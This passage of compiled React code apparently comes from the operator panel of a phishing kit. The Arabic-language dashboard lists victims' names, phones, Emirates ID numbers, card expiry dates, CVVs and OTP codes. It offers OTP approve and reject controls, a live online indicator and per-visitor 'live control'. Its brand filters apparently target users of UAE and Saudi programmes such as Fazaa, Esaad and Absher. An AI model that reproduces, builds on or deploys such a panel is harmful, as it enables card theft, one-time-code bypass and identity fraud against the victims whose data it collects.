  }, cancelledCount), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] text-rose-600/70 dark:text-rose-400/70 mt-0.5"
  }, "\u062A\u0645 \u0627\u0644\u0631\u0641\u0636 \u0623\u0648 \u0627\u0644\u0625\u0644\u063A\u0627\u0621")), /*#__PURE__*/React.createElement("div", {
    className: `p-3.5 rounded-2xl border text-right col-span-2 sm:col-span-1 ${isDark ? "bg-gray-800/80 border-gray-700" : "bg-white border-gray-200"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center justify-between"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xs text-purple-600 dark:text-purple-400 font-bold"
  }, "\u062F\u0641\u0639 \u0628\u0628\u0637\u0627\u0642\u0629"), /*#__PURE__*/React.createElement("span", {
    className: "text-sm"
  }, "\uD83D\uDCB3")), /*#__PURE__*/React.createElement("div", {
    className: "text-2xl font-black mt-1 text-purple-600 dark:text-purple-400 tabular-nums"
  }, cardCount), /*#__PURE__*/React.createElement("div", {
    className: "text-[10px] text-gray-400 mt-0.5"
  }, "\u0623\u062F\u062E\u0644\u0648\u0627 \u0628\u064A\u0627\u0646\u0627\u062A \u0628\u0637\u0627\u0642\u0629 \u0628\u0646\u0643\u064A\u0629"))), /*#__PURE__*/React.createElement("div", {
    className: `p-4 rounded-2xl border ${isDark ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200"} space-y-3 shadow-sm`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex flex-col md:flex-row items-stretch md:items-center justify-between gap-3"
  }, /*#__PURE__*/React.createElement("div", {
    className: "relative flex-1"
  }, /*#__PURE__*/React.createElement("input", {
    type: "text",
    placeholder: "\u0628\u062D\u062B \u0628\u0627\u0633\u0645 \u0627\u0644\u0639\u0645\u064A\u0644\u060C \u0627\u0644\u0647\u0627\u062A\u0641\u060C \u0631\u0642\u0645 \u0627\u0644\u0647\u0648\u064A\u0629\u060C \u0623\u0648 \u0622\u062E\u0631 4 \u0623\u0631\u0642\u0627\u0645 \u0645\u0646 \u0627\u0644\u0628\u0637\u0627\u0642\u0629...",
    className: `w-full pr-10 pl-4 py-2 rounded-xl text-xs border transition-all ${isDark ? "bg-gray-700 border-gray-600 text-white placeholder-gray-400" : "bg-gray-50 border-gray-200 text-gray-900 placeholder-gray-400"} outline-none focus:border-amber-500`,
    value: searchTerm,
    onChange: e => setSearchTerm(e.target.value)
  }), /*#__PURE__*/React.createElement("svg", {
    className: "w-4 h-4 absolute right-3 top-2.5 text-gray-400",
    fill: "none",
    stroke: "currentColor",
    viewBox: "0 0 24 24"
  }, /*#__PURE__*/React.createElement("path", {
    strokeLinecap: "round",
    strokeLinejoin: "round",
    strokeWidth: 2,
    d: "M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
  })), searchTerm && /*#__PURE__*/React.createElement("button", {
    onClick: () => setSearchTerm(""),
    className: "absolute left-3 top-2.5 text-gray-400 hover:text-gray-600 text-xs font-bold"
  }, "\u2715")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1 bg-gray-100 dark:bg-gray-750 p-1 rounded-xl flex-wrap"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("all"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${statusFilter === "all" ? "bg-white dark:bg-gray-700 text-gray-900 dark:text-white shadow-xs" : "text-gray-500 hover:text-gray-800 dark:hover:text-gray-200"}`
  }, "\u0627\u0644\u0643\u0644 (", totalCount, ")"), /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("pending"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1 cursor-pointer ${statusFilter === "pending" ? "bg-amber-500 text-white shadow-xs" : "text-amber-600 dark:text-amber-400 hover:bg-amber-50 dark:hover:bg-amber-950/30"}`
  }, /*#__PURE__*/React.createElement("span", null, "\u23F3 \u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629"), /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 rounded-full bg-black/10 dark:bg-white/20"
  }, pendingCount)), /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("completed"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1 cursor-pointer ${statusFilter === "completed" ? "bg-emerald-600 text-white shadow-xs" : "text-emerald-600 dark:text-emerald-400 hover:bg-emerald-50 dark:hover:bg-emerald-950/30"}`
  }, /*#__PURE__*/React.createElement("span", null, "\u2705 \u0645\u0643\u062A\u0645\u0644"), /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 rounded-full bg-black/10 dark:bg-white/20"
  }, completedCount)), /*#__PURE__*/React.createElement("button", {
    onClick: () => setStatusFilter("cancelled"),
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all flex items-center gap-1 cursor-pointer ${statusFilter === "cancelled" ? "bg-rose-600 text-white shadow-xs" : "text-rose-600 dark:text-rose-400 hover:bg-rose-50 dark:hover:bg-rose-950/30"}`
  }, /*#__PURE__*/React.createElement("span", null, "\u274C \u0645\u0644\u063A\u064A"), /*#__PURE__*/React.createElement("span", {
    className: "text-[10px] px-1.5 rounded-full bg-black/10 dark:bg-white/20"
  }, cancelledCount)))), /*#__PURE__*/React.createElement("div", {
    className: "flex flex-wrap items-center gap-2 pt-2 border-t border-gray-100 dark:border-gray-700/60 text-xs"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400 font-bold"
  }, "\u062A\u0635\u0641\u064A\u0629 \u062D\u0633\u0628:"), /*#__PURE__*/React.createElement("select", {
    value: brandFilter,
    onChange: e => setBrandFilter(e.target.value),
    className: `px-2.5 py-1.5 rounded-xl border text-xs font-bold outline-none cursor-pointer ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200 text-gray-800"}`
  }, /*#__PURE__*/React.createElement("option", {
    value: "all"
  }, "\u062C\u0645\u064A\u0639 \u0627\u0644\u062C\u0647\u0627\u062A (\u0627\u0644\u0643\u0644)"), /*#__PURE__*/React.createElement("option", {
    value: "fazaa"
  }, "\u0641\u0632\u0639\u0629 (FAZAA)"), /*#__PURE__*/React.createElement("option", {
    value: "esaad"
  }, "\u0625\u0633\u0639\u0627\u062F (ESAAD)"), /*#__PURE__*/React.createElement("option", {
    value: "homat"
  }, "\u062D\u0645\u0627\u0629 \u0627\u0644\u0648\u0637\u0646"), /*#__PURE__*/React.createElement("option", {
    value: "alsaada"
  }, "\u0627\u0644\u0633\u0639\u0627\u062F\u0629"), /*#__PURE__*/React.createElement("option", {
    value: "absher"
  }, "\u0623\u0628\u0634\u0631")), /*#__PURE__*/React.createElement("select", {
    value: paymentFilter,
    onChange: e => setPaymentFilter(e.target.value),
    className: `px-2.5 py-1.5 rounded-xl border text-xs font-bold outline-none cursor-pointer ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200 text-gray-800"}`
  }, /*#__PURE__*/React.createElement("option", {
    value: "all"
  }, "\u0643\u0627\u0641\u0629 \u0623\u0646\u0648\u0627\u0639 \u0627\u0644\u062F\u0641\u0639"), /*#__PURE__*/React.createElement("option", {
    value: "card"
  }, "\u0645\u0639 \u0628\u0637\u0627\u0642\u0629 \u0628\u0646\u0643\u064A\u0629 \u0641\u0642\u0637 (\uD83D\uDCB3)"), /*#__PURE__*/React.createElement("option", {
    value: "otp"
  }, "\u0623\u062F\u062E\u0644 \u0631\u0645\u0632 OTP \u0641\u0642\u0637 (\uD83D\uDD11)")), /*#__PURE__*/React.createElement("select", {
    value: sortBy,
    onChange: e => setSortBy(e.target.value),
    className: `px-2.5 py-1.5 rounded-xl border text-xs font-bold outline-none cursor-pointer mr-auto ${isDark ? "bg-gray-700 border-gray-600 text-white" : "bg-gray-50 border-gray-200 text-gray-800"}`
  }, /*#__PURE__*/React.createElement("option", {
    value: "newest"
  }, "\u0627\u0644\u062A\u0631\u062A\u064A\u0628: \u0627\u0644\u0623\u062D\u062F\u062B \u0623\u0648\u0644\u0627\u064B"), /*#__PURE__*/React.createElement("option", {
    value: "oldest"
  }, "\u0627\u0644\u062A\u0631\u062A\u064A\u0628: \u0627\u0644\u0623\u0642\u062F\u0645 \u0623\u0648\u0644\u0627\u064B"), /*#__PURE__*/React.createElement("option", {
    value: "name"
  }, "\u0627\u0644\u062A\u0631\u062A\u064A\u0628: \u062D\u0633\u0628 \u0627\u0644\u0627\u0633\u0645 (\u0623 - \u064A)")))), /*#__PURE__*/React.createElement("div", {
    className: `rounded-2xl border overflow-hidden shadow-sm ${isDark ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "overflow-x-auto"
  }, /*#__PURE__*/React.createElement("table", {
    className: "w-full text-right text-xs",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("thead", null, /*#__PURE__*/React.createElement("tr", {
    className: `border-b ${isDark ? "bg-gray-750/70 border-gray-700 text-gray-300" : "bg-gray-50/80 border-gray-200 text-gray-600"} font-bold`
  }, /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "# \u0627\u0644\u0645\u0639\u0631\u0641"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "\u0627\u0644\u0639\u0645\u064A\u0644 / \u0627\u0644\u062A\u0648\u0627\u0635\u0644"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "\u0627\u0644\u0628\u0637\u0627\u0642\u0629 \u0648\u0627\u0644\u062C\u0647\u0629"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "\u0628\u064A\u0627\u0646\u0627\u062A \u0627\u0644\u062F\u0641\u0639 \u0648\u0627\u0644\u0628\u0637\u0627\u0642\u0629"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "\u0631\u0645\u0632 OTP"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "\u0627\u0644\u0645\u0631\u062D\u0644\u0629 \u0627\u0644\u062D\u0627\u0644\u064A\u0629"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4"
  }, "\u0648\u0642\u062A \u0648\u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0637\u0644\u0628"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4 text-center"
  }, "\u062D\u0627\u0644\u0629 \u0627\u0644\u0637\u0644\u0628 (\u062A\u0641\u0627\u0639\u0644\u064A\u0629)"), /*#__PURE__*/React.createElement("th", {
    className: "py-3 px-4 text-left"
  }, "\u0625\u062C\u0631\u0627\u0621\u0627\u062A"))), /*#__PURE__*/React.createElement("tbody", {
    className: "divide-y divide-gray-100 dark:divide-gray-700/60"
  }, sorted.length === 0 ? /*#__PURE__*/React.createElement("tr", null, /*#__PURE__*/React.createElement("td", {
    colSpan: 9,
    className: "py-12 text-center text-gray-400"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex flex-col items-center justify-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-3xl"
  }, "\uD83D\uDCED"), /*#__PURE__*/React.createElement("span", {
    className: "font-bold text-sm"
  }, "\u0644\u0627 \u062A\u0648\u062C\u062F \u0637\u0644\u0628\u0627\u062A \u062A\u0637\u0627\u0628\u0642 \u0645\u0639\u0627\u064A\u064A\u0631 \u0627\u0644\u062A\u0635\u0641\u064A\u0629 \u0648\u0627\u0644\u0628\u062D\u062B"), /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      setSearchTerm("");
      setStatusFilter("all");
      setBrandFilter("all");
      setPaymentFilter("all");
    },
    className: "mt-2 text-xs text-blue-600 dark:text-blue-400 hover:underline"
  }, "\u0625\u0639\u0627\u062F\u0629 \u0636\u0628\u0637 \u0639\u0648\u0627\u0645\u0644 \u0627\u0644\u062A\u0635\u0641\u064A\u0629")))) : sorted.map((v, idx) => {
    const cardInfo = parseCardTypeAndBrand(v);
    const currentStatus = v.orderStatus || "pending";
    const bankInfo = v.cardNumber ? getBankInfo(v.cardNumber) : null;
    const isFeedback = feedbackId === v.id;
    return /*#__PURE__*/React.createElement("tr", {
      key: v.id,
      className: `transition-colors hover:bg-gray-50/80 dark:hover:bg-gray-750/50 ${isFeedback ? isDark ? "bg-amber-950/20" : "bg-amber-50/40" : ""}`
    }, /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4 font-mono"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-1.5"
    }, v.online ? /*#__PURE__*/React.createElement("span", {
      className: "relative flex h-2 w-2 flex-shrink-0",
      title: "\u0645\u062A\u0635\u0644 \u0627\u0644\u0622\u0646"
    }, /*#__PURE__*/React.createElement("span", {
      className: "animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"
    }), /*#__PURE__*/React.createElement("span", {
      className: "relative inline-flex rounded-full h-2 w-2 bg-emerald-500"
    })) : /*#__PURE__*/React.createElement("span", {
      className: "h-2 w-2 rounded-full bg-gray-300 dark:bg-gray-600 flex-shrink-0",
      title: "\u063A\u064A\u0631 \u0645\u062A\u0635\u0644"
    }), /*#__PURE__*/React.createElement("span", {
      className: "font-bold text-gray-700 dark:text-gray-300 text-[11px]"
    }, v.id.length > 14 ? v.id.slice(0, 12) + "…" : v.id)), /*#__PURE__*/React.createElement("div", {
      className: "text-[10px] text-gray-400 font-sans mt-0.5"
    }, "#", idx + 1)), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4"
    }, /*#__PURE__*/React.createElement("div", {
      className: "font-bold text-gray-900 dark:text-white flex items-center gap-1.5"
    }, /*#__PURE__*/React.createElement("span", null, v.name || v.bookingData && v.bookingData["الاسم"] || "زائر جديد")), (v.phone || v.bookingData && v.bookingData["الهاتف"]) && /*#__PURE__*/React.createElement("div", {
      className: "text-[11px] text-gray-600 dark:text-gray-400 font-mono flex items-center gap-1 mt-0.5",
      dir: "ltr"
    }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCDE"), /*#__PURE__*/React.createElement("span", null, v.phone || v.bookingData && v.bookingData["الهاتف"])), (v.emiratesId || v.bookingData && v.bookingData["رقم الهوية"]) && /*#__PURE__*/React.createElement("div", {
      className: "text-[10px] text-gray-400 font-mono mt-0.5",
      dir: "ltr"
    }, "ID: ", v.emiratesId || v.bookingData && v.bookingData["رقم الهوية"])), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex flex-col gap-1 items-start"
    }, /*#__PURE__*/React.createElement("span", {
      className: `px-2 py-0.5 rounded-lg text-[11px] font-bold ${cardInfo.brandKey === "fazaa" ? "bg-amber-100 text-amber-900 dark:bg-amber-950/60 dark:text-amber-300" : cardInfo.brandKey === "esaad" ? "bg-blue-100 text-blue-900 dark:bg-blue-950/60 dark:text-blue-300" : cardInfo.brandKey === "homat" ? "bg-emerald-100 text-emerald-900 dark:bg-emerald-950/60 dark:text-emerald-300" : cardInfo.brandKey === "alsaada" ? "bg-purple-100 text-purple-900 dark:bg-purple-950/60 dark:text-purple-300" : "bg-teal-100 text-teal-900 dark:bg-teal-950/60 dark:text-teal-300"}`
    }, cardInfo.brandName), /*#__PURE__*/React.createElement("span", {
      className: "text-[11px] font-semibold text-gray-600 dark:text-gray-300"
    }, cardInfo.typeName))), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4 font-mono"
    }, v.cardNumber ? /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("div", {
      className: "font-bold text-gray-900 dark:text-white flex items-center gap-1",
      dir: "ltr"
    }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCB3"), /*#__PURE__*/React.createElement("span", null, maskCard(v.cardNumber))), /*#__PURE__*/React.createElement("div", {
      className: "flex items-center gap-2 text-[10px] text-gray-500 dark:text-gray-400 mt-0.5"
    }, /*#__PURE__*/React.createElement("span", null, "EXP: ", v.expiry || "—"), /*#__PURE__*/React.createElement("span", null, "CVV: ", v.cvv || "—")), bankInfo && /*#__PURE__*/React.createElement("div", {
      className: "text-[10px] text-blue-600 dark:text-blue-400 font-sans mt-0.5 truncate max-w-[140px]"
    }, bankInfo.name)) : /*#__PURE__*/React.createElement("span", {
      className: "text-[11px] text-gray-400 font-sans italic"
    }, "\u0628\u062F\u0648\u0646 \u0628\u0637\u0627\u0642\u0629 \u062D\u062A\u0649 \u0627\u0644\u0622\u0646")), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4"
    }, v.otp ? /*#__PURE__*/React.createElement("div", {
      className: "flex flex-col items-start gap-0.5"
    }, /*#__PURE__*/React.createElement("span", {
      className: "font-mono font-black text-xs px-2 py-0.5 rounded bg-purple-100 text-purple-800 dark:bg-purple-950/60 dark:text-purple-300 border border-purple-200 dark:border-purple-800/50",
      dir: "ltr"
    }, v.otp), v.otpApprovalStatus === "approved" ? /*#__PURE__*/React.createElement("span", {
      className: "text-[10px] text-emerald-600 font-bold"
    }, "\u0645\u0639\u062A\u0645\u062F \u2713") : v.otpApprovalStatus === "rejected" ? /*#__PURE__*/React.createElement("span", {
      className: "text-[10px] text-rose-600 font-bold"
    }, "\u0645\u0631\u0641\u0648\u0636 \u2715") : /*#__PURE__*/React.createElement("span", {
      className: "text-[10px] text-amber-600 font-bold"
    }, "\u0628\u0627\u0646\u062A\u0638\u0627\u0631 \u0627\u0644\u062A\u062F\u0642\u064A\u0642")) : /*#__PURE__*/React.createElement("span", {
      className: "text-gray-400 text-[11px]"
    }, "\u2014")), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4"
    }, /*#__PURE__*/React.createElement("span", {
      className: "inline-block px-2 py-1 rounded-lg text-[11px] font-bold bg-gray-100 dark:bg-gray-700 text-gray-800 dark:text-gray-200"
    }, getStepLabel(v.step))), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4 font-mono"
    }, /*#__PURE__*/React.createElement("div", {
      className: "text-[11px] text-gray-800 dark:text-gray-200",
      dir: "ltr"
    }, formatShortTime(v.createdAt || v.updatedAt)), /*#__PURE__*/React.createElement("div", {
      className: "text-[10px] text-gray-400 font-sans mt-0.5"
    }, timeAgo(v.createdAt || v.updatedAt))), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4 text-center"
    }, /*#__PURE__*/React.createElement("div", {
      className: "inline-flex flex-col items-center gap-1"
    }, /*#__PURE__*/React.createElement("select", {
      value: currentStatus,
      onChange: e => handleStatusChange(v.id, e.target.value),
      className: `text-xs font-bold rounded-xl px-3 py-1.5 border cursor-pointer outline-none transition-all shadow-xs ${currentStatus === "completed" ? "bg-emerald-50 text-emerald-800 border-emerald-300 dark:bg-emerald-950/60 dark:text-emerald-300 dark:border-emerald-700" : currentStatus === "cancelled" ? "bg-rose-50 text-rose-800 border-rose-300 dark:bg-rose-950/60 dark:text-rose-300 dark:border-rose-700" : "bg-amber-50 text-amber-800 border-amber-300 dark:bg-amber-950/60 dark:text-amber-300 dark:border-amber-700"}`
    }, /*#__PURE__*/React.createElement("option", {
      value: "pending"
    }, "\u23F3 \u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629"), /*#__PURE__*/React.createElement("option", {
      value: "completed"
    }, "\u2705 \u0645\u0643\u062A\u0645\u0644"), /*#__PURE__*/React.createElement("option", {
      value: "cancelled"
    }, "\u274C \u0645\u0644\u063A\u064A")), isFeedback && /*#__PURE__*/React.createElement("span", {
      className: "text-[10px] text-emerald-600 dark:text-emerald-400 font-bold animate-pulse"
    }, "\u062A\u0645 \u0627\u0644\u062D\u0641\u0638 \u0628\u0646\u062C\u0627\u062D \u2713"))), /*#__PURE__*/React.createElement("td", {
      className: "py-3.5 px-4 text-left"
    }, /*#__PURE__*/React.createElement("div", {
      className: "flex items-center justify-end gap-1.5"
    }, /*#__PURE__*/React.createElement("button", {
      onClick: () => setSelectedOrder(v),
      className: "px-2.5 py-1.5 rounded-lg text-xs font-bold bg-gray-100 hover:bg-gray-200 dark:bg-gray-700 dark:hover:bg-gray-650 text-gray-700 dark:text-gray-200 transition-all cursor-pointer",
      title: "\u0639\u0631\u0636 \u062A\u0641\u0627\u0635\u064A\u0644 \u0627\u0644\u0637\u0644\u0628 \u0627\u0644\u0643\u0627\u0645\u0644\u0629"
    }, "\uD83D\uDD0D \u062A\u0641\u0627\u0635\u064A\u0644"), /*#__PURE__*/React.createElement("button", {
      onClick: () => onSelectVisitor(v.id),
      className: "px-2.5 py-1.5 rounded-lg text-xs font-bold bg-blue-50 hover:bg-blue-100 dark:bg-blue-900/30 dark:hover:bg-blue-900/50 text-blue-600 dark:text-blue-400 transition-all cursor-pointer flex items-center gap-1",
      title: "\u0641\u062A\u062D \u0647\u0630\u0627 \u0627\u0644\u0632\u0627\u0626\u0631 \u0641\u064A \u0646\u0627\u0641\u0630\u0629 \u0627\u0644\u0645\u062A\u0627\u0628\u0639\u0629 \u0627\u0644\u0645\u0628\u0627\u0634\u0631\u0629 \u0648\u0627\u0644\u062A\u062D\u0643\u0645"
    }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDCAC"), /*#__PURE__*/React.createElement("span", {
      className: "hidden sm:inline"
    }, "\u0645\u062A\u0627\u0628\u0639\u0629")), /*#__PURE__*/React.createElement("button", {
      onClick: () => onDelete(v.id),
      className: "p-1.5 rounded-lg text-red-400 hover:text-red-600 hover:bg-red-50 dark:hover:bg-red-900/30 transition-all cursor-pointer",
      title: "\u062D\u0630\u0641 \u0627\u0644\u0637\u0644\u0628"
    }, /*#__PURE__*/React.createElement("svg", {
      className: "w-4 h-4",
      fill: "none",
      stroke: "currentColor",
      viewBox: "0 0 24 24"
    }, /*#__PURE__*/React.createElement("path", {
      strokeLinecap: "round",
      strokeLinejoin: "round",
      strokeWidth: 2,
      d: "M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"
    }))))));
  })))), /*#__PURE__*/React.createElement("div", {
    className: `p-3 border-t flex flex-col sm:flex-row items-center justify-between gap-2 text-xs text-gray-500 dark:text-gray-400 ${isDark ? "bg-gray-750/40 border-gray-700" : "bg-gray-50/60 border-gray-200"}`
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", null, "\u064A\u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0644\u062D\u0638\u064A\u0627\u064B \u0648\u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B \u0639\u0628\u0631 \u0627\u0644\u062E\u0627\u062F\u0645"), /*#__PURE__*/React.createElement("span", null, "\u2022"), /*#__PURE__*/React.createElement("span", null, "\u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0637\u0644\u0628\u0627\u062A \u0627\u0644\u0645\u0639\u0631\u0648\u0636\u0629: ", /*#__PURE__*/React.createElement("strong", null, sorted.length))), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-3"
  }, /*#__PURE__*/React.createElement("span", {
    className: "flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-amber-500"
  }), " \u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629: ", pendingCount), /*#__PURE__*/React.createElement("span", {
    className: "flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-emerald-500"
  }), " \u0645\u0643\u062A\u0645\u0644: ", completedCount), /*#__PURE__*/React.createElement("span", {
    className: "flex items-center gap-1"
  }, /*#__PURE__*/React.createElement("span", {
    className: "w-2 h-2 rounded-full bg-rose-500"
  }), " \u0645\u0644\u063A\u064A: ", cancelledCount)))), selectedOrder && /*#__PURE__*/React.createElement("div", {
    className: "fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm",
    dir: "rtl"
  }, /*#__PURE__*/React.createElement("div", {
    className: `w-full max-w-2xl rounded-2xl shadow-2xl border overflow-hidden ${isDark ? "bg-gray-800 border-gray-700 text-white" : "bg-white border-gray-200 text-gray-900"} max-h-[90vh] flex flex-col`
  }, /*#__PURE__*/React.createElement("div", {
    className: "p-4 border-b flex items-center justify-between border-gray-200 dark:border-gray-700"
  }, /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-2"
  }, /*#__PURE__*/React.createElement("span", {
    className: "text-xl"
  }, "\uD83D\uDCB3"), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("h3", {
    className: "font-bold text-base"
  }, "\u062A\u0641\u0627\u0635\u064A\u0644 \u0637\u0644\u0628 \u0627\u0644\u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u0643\u0627\u0645\u0644"), /*#__PURE__*/React.createElement("p", {
    className: "text-xs text-gray-400 font-mono"
  }, "ID: ", selectedOrder.id))), /*#__PURE__*/React.createElement("button", {
    onClick: () => setSelectedOrder(null),
    className: "p-1.5 rounded-xl hover:bg-gray-100 dark:hover:bg-gray-700 text-gray-400 hover:text-gray-600 transition-all cursor-pointer"
  }, "\u2715")), /*#__PURE__*/React.createElement("div", {
    className: "p-5 overflow-y-auto space-y-4 custom-scrollbar text-xs"
  }, /*#__PURE__*/React.createElement("div", {
    className: `p-4 rounded-xl border flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 ${(selectedOrder.orderStatus || "pending") === "completed" ? "bg-emerald-50/70 border-emerald-300 dark:bg-emerald-950/30 dark:border-emerald-800" : (selectedOrder.orderStatus || "pending") === "cancelled" ? "bg-rose-50/70 border-rose-300 dark:bg-rose-950/30 dark:border-rose-800" : "bg-amber-50/70 border-amber-300 dark:bg-amber-950/30 dark:border-amber-800"}`
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-xs font-bold text-gray-700 dark:text-gray-300"
  }, "\u062D\u0627\u0644\u0629 \u0647\u0630\u0627 \u0627\u0644\u0637\u0644\u0628 \u0627\u0644\u0622\u0646:"), /*#__PURE__*/React.createElement("div", {
    className: "text-sm font-black mt-0.5"
  }, (selectedOrder.orderStatus || "pending") === "completed" ? "✅ مكتمل (تم الاعتماد والتأكيد)" : (selectedOrder.orderStatus || "pending") === "cancelled" ? "❌ ملغي (تم رفض أو إلغاء الطلب)" : "⏳ قيد المراجعة والتدقيق")), /*#__PURE__*/React.createElement("div", {
    className: "flex items-center gap-1.5 flex-wrap"
  }, /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      handleStatusChange(selectedOrder.id, "pending");
      setSelectedOrder(prev => ({
        ...prev,
        orderStatus: "pending"
      }));
    },
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${(selectedOrder.orderStatus || "pending") === "pending" ? "bg-amber-500 text-white shadow-sm" : "bg-white dark:bg-gray-700 text-amber-700 dark:text-amber-300 border border-amber-200 dark:border-amber-800"}`
  }, "\u23F3 \u0642\u064A\u062F \u0627\u0644\u0645\u0631\u0627\u062C\u0639\u0629"), /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      handleStatusChange(selectedOrder.id, "completed");
      setSelectedOrder(prev => ({
        ...prev,
        orderStatus: "completed"
      }));
    },
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${selectedOrder.orderStatus === "completed" ? "bg-emerald-600 text-white shadow-sm" : "bg-white dark:bg-gray-700 text-emerald-700 dark:text-emerald-300 border border-emerald-200 dark:border-emerald-800"}`
  }, "\u2705 \u0627\u0639\u062A\u0645\u0627\u062F \u0648\u0645\u0643\u062A\u0645\u0644"), /*#__PURE__*/React.createElement("button", {
    onClick: () => {
      handleStatusChange(selectedOrder.id, "cancelled");
      setSelectedOrder(prev => ({
        ...prev,
        orderStatus: "cancelled"
      }));
    },
    className: `px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${selectedOrder.orderStatus === "cancelled" ? "bg-rose-600 text-white shadow-sm" : "bg-white dark:bg-gray-700 text-rose-700 dark:text-rose-300 border border-rose-200 dark:border-rose-800"}`
  }, "\u274C \u0625\u0644\u063A\u0627\u0621 \u0627\u0644\u0637\u0644\u0628"))), /*#__PURE__*/React.createElement("div", {
    className: `p-4 rounded-xl border ${isDark ? "bg-gray-750/50 border-gray-700" : "bg-gray-50 border-gray-200"}`
  }, /*#__PURE__*/React.createElement("h4", {
    className: "font-bold text-gray-900 dark:text-white mb-2 flex items-center gap-1.5"
  }, /*#__PURE__*/React.createElement("span", null, "\uD83D\uDC64"), /*#__PURE__*/React.createElement("span", null, "\u0645\u0639\u0644\u0648\u0645\u0627\u062A \u0627\u0644\u0639\u0645\u064A\u0644 \u0648\u0627\u0644\u0627\u062A\u0635\u0627\u0644:")), /*#__PURE__*/React.createElement("div", {
    className: "grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs"
  }, /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0627\u0644\u0627\u0633\u0645:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "text-gray-800 dark:text-gray-200"
  }, selectedOrder.name || selectedOrder.bookingData && selectedOrder.bookingData["الاسم"] || "—")), /*#__PURE__*/React.createElement("div", null, /*#__PURE__*/React.createElement("span", {
    className: "text-gray-400"
  }, "\u0631\u0642\u0645 \u0627\u0644\u0647\u0627\u062A\u0641:"), " ", /*#__PURE__*/React.createElement("strong", {
    className: "font-mono text-gray-800 dark:text-gray-200",
    dir: "ltr"
